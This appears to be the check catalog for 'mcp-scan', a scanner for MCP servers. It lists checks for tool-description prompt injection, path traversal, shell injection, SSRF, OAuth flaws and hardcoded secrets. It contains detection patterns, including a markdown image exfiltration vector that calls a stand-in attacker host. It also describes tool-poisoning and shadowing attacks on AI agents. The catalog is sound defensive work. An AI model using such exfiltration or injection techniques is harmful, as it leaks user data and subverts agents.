# mcp-scan — Check Catalog (v0.1 target)

This is the full set of 25 checks targeted for `mcp-scan` v0.1. Each check has an ID of the form `MCPA-NNN`. Checks land incrementally — see the status column.

**Method legend:**

| code | meaning |
|---|---|
| S  | Static parse of manifest / config / `tools/list` |
| C  | Static AST scan of handler source code (requires `--source`) |
| D  | Dynamic probe against a running server |
| X  | Dependency / CVE database match |

**Status legend:** 🟢 shipped · 🟡 in progress · ⚪ planned

---

## Tool schema & prompt-injection surface

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-001** | Tool description contains prompt-injection markers (imperative verbs, `<system>` tags, exfiltration phrases) | Critical | S | 🟢 |
| **MCPA-002** | Tool description contains ANSI escape / C0 control / zero-width / Unicode-tag characters | High | S | 🟢 |
| **MCPA-003** | Tool description hash-pin drift (SHA-256 of `{name, description, inputSchema}` changed between scans) | High | S | ⚪ |
| **MCPA-004** | Duplicate / shadowed tool names across servers declared in the same host config | High | S | ⚪ |

**References:**
- Trail of Bits — *Jumping the line: how MCP servers can attack you before you ever use them* (Apr 2025)
- Trail of Bits — *Deceiving users with ANSI terminal codes in MCP* (Apr 2025)
- Invariant Labs — *Tool poisoning in MCP* / *Tool shadowing*
- MCPoison / Cursor rug pull

## Resource access & sandbox

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-010** | Path traversal in filesystem handler arguments (missing `is_relative_to()` containment; `resolve()` alone is not sufficient) | Critical | C | 🟢 |
| **MCPA-011** | Symlink-follow in sandboxed FS ops (missing `O_NOFOLLOW` / unchecked `is_symlink()`) | High | C | ⚪ |
| **MCPA-012** | `shell=True` / unsanitized `subprocess` call with user-controlled arguments | Critical | C | 🟢 |
| **MCPA-013** | Resource URI traversal via `resources/read` (`file:///../...`, URL-encoded `..%2f`) | High | D | ⚪ |

**References:**
- CVE-2025-53109, CVE-2025-53110 (EscapeRoute — filesystem MCP sandbox bypass)
- CVE-2025-68143, CVE-2025-68144, CVE-2025-68145 (Anthropic Git MCP path traversal + argument injection)

## Supply chain

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-020** | Dependency CVE match against curated MCP CVE list | Critical | X | ⚪ |
| **MCPA-021** | MCP package typosquat heuristic (Levenshtein vs known-official publishers) | High | S | ⚪ |

**References:**
- CVE-2025-6514 (`mcp-remote` RCE, CVSS 9.6, 558k downloads)
- npm / PyPI typosquat cluster (early 2026)

## Transport & binding

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-030** | "NeighborJack": server bound to `0.0.0.0` / non-loopback without authentication | Critical | S+D | ⚪ |
| **MCPA-031** | HTTP transport without TLS on a non-loopback address | High | S+D | ⚪ |

## OAuth 2.1 / DCR conformance

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-040** | Missing `/.well-known/oauth-protected-resource` (RFC 9728 PRM) | High | D | ⚪ |
| **MCPA-041** | Missing `WWW-Authenticate: Bearer resource_metadata=…` on 401 responses | Medium | D | ⚪ |
| **MCPA-042** | Accepts tokens with wrong / missing `aud` (token passthrough — RFC 8707) | Critical | D | ⚪ |
| **MCPA-043** | Dynamic Client Registration endpoint open + no per-client consent (confused-deputy risk) | High | D | ⚪ |
| **MCPA-044** | Redirect URI wildcard / pattern match at the AS | High | D | ⚪ |
| **MCPA-045** | Overbroad scopes advertised (`*`, `admin`, `all`, `full-access`) | Medium | D | ⚪ |

**References:** MCP Spec 2025-06-18 §§ Authorization, Confused Deputy, Token Passthrough, Redirect URI Validation.

## Session & transport state

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-050** | Predictable / sequential session IDs (low entropy) | High | D | ⚪ |

## SSRF & exfiltration channels

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-060** | SSRF sink in HTTP-fetch tools (no host allowlist; fetches to `169.254.169.254`, `127.0.0.1`, RFC1918 should be blocked) | High | C | 🟢 |
| **MCPA-061** | Markdown image / auto-link exfiltration vector in tool output (`![](http://attacker/{data})`) | Medium | S+D | ⚪ |

**References:** Microsoft MarkItDown MCP SSRF → AWS IMDS; Simon Willison *lethal trifecta*.

## Configuration drift & observability

| ID | Name | Severity | Method | Status |
|---|---|---|---|---|
| **MCPA-070** | Hardcoded secrets in Python source (`sk-`, `ghp_`, `AKIA`, `xoxb-`, high-entropy strings in secret-named variables) | High | C | 🟢 |
| **MCPA-071** | `trust: true` / `autoApprove` / `requireApproval: false` defaults | Medium | S | ⚪ |
| **MCPA-072** | No tool-call audit logging in handler modules | Low | C | ⚪ |
| **MCPA-073** | Unbounded recursion / missing depth guard on `tools/call` or `sampling/createMessage` | Medium | C | ⚪ |

---

## Deliberately NOT in v0.1

These are handled better by neighboring tools. mcp-scan cites them rather than duplicates them.

- **Semantic LLM-judge prompt-injection scoring of descriptions** → use [`invariantlabs-ai/mcp-scan`](https://github.com/invariantlabs-ai/mcp-scan). v0.2 may ship `--deep` using a local model.
- **Toxic-flow graph analysis across multi-server configs** → Invariant Guardrails.
- **Runtime proxy / traffic interception** → [Lunar MCPX](https://www.lunar.dev/product/mcp), [Trail of Bits `mcp-context-protector`](https://github.com/trailofbits/mcp-context-protector).
- **Container SBOM / image signing** → Docker MCP Gateway + Docker Scout + Trivy. v0.2 may import their SBOM outputs.
- **Client-side consent UI audits** → host-app concern, not server-scanner concern.

## Confidence tagging

- **Proven (published CVE / incident / spec-mandated):** MCPA-001, 002, 003, 004, 010, 011, 012, 020, 030, 040, 042, 043, 060, 061, 070, 013.
- **Spec-mandated, no public exploit yet:** MCPA-031, 041, 044, 045, 050.
- **Theoretical / best-practice:** MCPA-021, 071, 072, 073.
